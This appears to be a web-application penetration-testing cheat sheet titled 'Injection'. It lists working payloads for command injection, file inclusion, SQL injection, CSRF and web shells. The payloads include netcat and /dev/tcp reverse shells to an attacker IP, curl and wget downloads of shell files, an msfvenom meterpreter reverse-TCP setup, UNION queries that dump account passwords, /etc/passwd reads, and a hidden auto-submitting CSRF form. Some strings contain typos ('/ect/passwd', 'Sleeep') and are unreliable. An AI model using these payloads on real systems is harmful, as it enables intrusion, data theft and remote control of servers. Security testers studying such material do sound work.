---
title: Injection
category: Web Application
order: 4
---

> **Test for Command Injection**
<br>
aaa

Prefixs before attack payload (command seperator): | <code> ``, &, &&, ||,  <, >, ;, $() </code>
Test Visable: | <code> ; ls /ect/passwd or /ect/hosts </code>
Test Blind Ping: | <code> ; ping y.o.ur.ip <br> <br> On your attack system: <br> sudo tcpdump -n host [victimIP] and icmp </code>
Test Blind DNS: | <code> nslookup (you need a public facing system to see nslookup)</code>
Test Blind Sleep: | <code> http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10 </code>
Commix | <code> commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" </code>
Commix 2 | <code> python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4" </code>

> **Exploit Command Injection**

{% highlight bash %}
#Attacker Machine
tcpdump -n host <webserver IP> and ICMP
nc -l [port]
#Victim
test; ping -c 4 <yourAttackerIP>; echo hello 
test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello

#Alternative to NC for non-debian based distrobutions
/bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 

#Alternative without spaces
http://victim/file?arg=$(CMD=$'curl\x20http://[AttackerIP]/shell.php\x20--output\x20/tmp/Notshell.php';$CMD)
http://victim/file?arg=$({wget,http://[AttackerIP]:[AttackerPort]/t,-O,/tmp/t})
http://victim/file?arg=$({chmod,+x,/tmp/t})
{% endhighlight %}


> **File Inclusion**

**Test Strings:**

Linux Test String 1 | <code> http://website/?p=file%3a%2f%2f%2fetc%2fpasswd </code>
Linux Test String 2 | <code> /ect/passwd </code>
Linux Test String 3 | <code> ../../../../../../../../../../../../../../ect/passwd </code>
Windows IIS 1 | <code> ../../../winnt/system32.cmd.exe+/c+dir (not frequent) </code>
Windows Test String 1 | <code> %WINDIR%\win.ini </code>
Windows Test String 2 | <code> %SYSTEMDRIVE%\boot.ini //note only older versions of windows </code>


**What to go after - Linux:**
* /etc/passwd
* [Linux pwnwiki](http://pwnwiki.io/#!presence/linux/blind.md)

**File Locations -Debian w/ Apache:**
* /var/www/html
* /home/username/public_html
* /use/lib/cgi-bin

**Grab PHP files and Binary Data**

Obtain Base64 Data | <code> http://website/?p=php://filter/convert.base64-encode/resource=/etc/php/7.0/apache2/php.ini <br> http://website/?p=php://filter/convert.base64-encode/resource=index.php </code>
Decode base64 data | <code> curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=index" | base64 -d </code>


**Auto-Extension (.php) Bypass:**
* NULL "%00"

>**Shell from RFI and LFI**

**RFI Shell 1:**
1. VI a webshell (https://binaryexile.github.io/6%20-%20Web%20Application/Vulnerabilities/)
2. python -m SimpleHTTPServer 8080
3. Set up netcat listener (if needed based on webshell)
3. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)

**RFI Meterpreter Shell:**
1. Create Payload: msfvenom LPORT=1234 LHOST=192.168.1.8 -p php/meterpreter_reverse_tcp -f raw > ~/met_rev_tcp_1234.txt
2. Wrap it: add <?php ?> to the payload
3.  Set up handler: 
* use exploit/multi/handler
* set payload php/meterpreter_reverse/tcp
* set lhost 192.168.1.8
* set lport 1234
exploit
4.  python -m SimpleHTTPServer 8080
5. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)

**LFI Shell:**
* [LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
* [LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)

> **SQL Injection: Test Location and Strings**

**Test Locations:**
* GET URL query parameters
* POST parameters
* Cookie (session information)
* User-Agent

**Visable Test Strings:**
{% highlight bash %}
' ` " ; /* --
{% endhighlight %}

**Blind Test Strings:**<br>
*Try the following to see if it provides valid results for text that was interpreted:*

Commenting out the end | <code> Dent' ;# <br> Dent' ;-- </code>
Inline Commenting | <code> De'/* */'nt </code>
Concatenation | <code> De''nt <br> De'||'nt </code>
Binary/Boolean | <code> Dent' and 1;# <br> Dent' and 1=1;# <br> Dent' and 0;# <br> Dent' and 1=0;# </code>
Sleep | <code> Sleeep(10) MySQL <br>  WAITFOR DELAY '0:0:10'  MSSQL

Determine the level of blindness:
{% highlight sql %}
Dent' AND 1;#
Dent' AND 1=1;#

Dent' AND 0;#
Dent' AND 1=0;#
#Look for differences
{% endhighlight %}

> **SQL Injection: Database Identification**

MS SQL Server | Incorrect syntax near 'something'
MS SQL Server | <code> 'De'+'nt' </code>
MS SQL Server | <code> SELECT @@version  </code>
MS SQL Server | <code> @@pack_received </code>
MySQL | 'De' 'nt'
MySQL | <code> SELECT @@version  </code>
MySQL | <code> connection_id() </code>
Oracle | ORA-01756: quoted string not properly terminated
Oracle | <code> 'De'||'nt' </code>
Oracle | <code> BITAND(1,1) </code>
PostgreSQL | 5-digit Hex Error Code

> **SQL Injection: Database, Table, and Columns

MySQL:
Database | schema_name FROM information_schema.schemata 
Table | table_name FROM information_schema.tables
Columns | column_name From information_schema.columns

SQL Server:
Database | name FROM sys.databases 
Table | name FROM sys.tables 
Columns | name FROM sys.coumns

Oracle DB:
Database | owner FROM all_tables 
Table | table_name FROM all_tables 
Columns | column_name FROM all_tab_columns

> **SQL Injection Union**

Once you have identified SQL injection, use order by (increase until it breaks):
{% highlight sql %}
dent' and 'a'='a' ORDER BY 1; #
...
dent' and 'a'='a' ORDER BY 5; #
{% endhighlight %}
 See which fields (e.g., numbers) are visable in the output. 
{% highlight sql %}
Dent' UNION SELECT  '1', '2', '3', '4'; #
{% endhighlight %}
From the visable numbers select one for the union. <br> *Note: It requires the same number of columns and compatable data type*
{% highlight sql %}
Dent' UNION SELECT  '1', '2', '3', info FROM information_schema.processlist; #
<br>
or use NULL since it is compatable with everything
<br>
Dent' UNION SELECT NULL, NULL, NULL;--
<b>
jeremy'+union+select+concat('The+password+for+',username,'+is+',+password),mysignature+from+accounts;+--+
{% endhighlight %}

> **Blind SQL Injection Data Exfiltration**

Perform a binary search tree using substr: 

{% highlight sql %}
#Use
substr(([Query]),[Letter],[Word]) > "m"

substr((select table_name from information_schema.tables limit 1),1,1) > "m"
…
= "c"

{% endhighlight %}

> **Stacked Queries**

Allows multiple commands with a ';'  (Mostly MSSQL):
{% highlight sql %}
Dent' ;  CREATE TABLE exfil(data varchar(1000));-- 
{% endhighlight %}


> **Reading and Writing Files**

MySQL - Reading | <code> Dent'+UNION+SELECT++'1'%2C+'2'%2C+'3'%2C+LOAD_FILE("%2Fetc%2Fpasswd")%3B+%23 </code>
MySQL - Writing | <code> INTO OUTFILE </code>
SQL Server - Reading | <code> BULK INSERT </code>


> **SQL Injection Cheat Sheets**

* [websec](https://websec.ca/kb/sql_injection)
* [PentestMonkey](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
* [SQLInjection Wiki](http://www.sqlinjectionwiki.com)

> **CSRF**

GET:
{% highlight html %}
<img src="http://<ip_of_site>/form.php?<parameter>=<value>
{% endhighlight %}

POST:
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">
<input type="hidden" name="<paramater>" value="<value>"/>
<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
       tabindex="-1"/>
</form>
<script>document.getElementById('CSRF').submit();</script>
{% endhighlight %}


> **Web Shells**

Kali: 

PHP | <code> /usr/share/webshells/php/ </code>
PERL | <code> /usr/share/webshells/perl/ </code>
Cold Fusion | <code> /usr/share/webshells/cfm/ </code>
ASP | <code> /usr/share/webshells/asp/ </code>
ASPX | <code> /usr/share/webshells/aspx/ </code>
JSP | <code> /usr/share/webshells/jsp/jsp-reverse.jsp </code>

Online:

* [PHP and Perl](http://pentestmonkey.net/category/tools/web-shells)
* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

> **Useful Resources**

* [MongoDB](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [Command Injection](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [Fuzzing List](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors)
* [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [XSS Examples](http://www.xssed.com/)
* [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)
* [Access Injection Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
[Commix](http://www.kitploit.com/2015/04/commix-automated-all-in-one-os-command.html)
[LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)
[CGI-Bin](https://www.hellboundhackers.org/articles/read-article.php?article_id=7)

> **Useful Tools**
* [SQLMap](http://sqlmap.org)

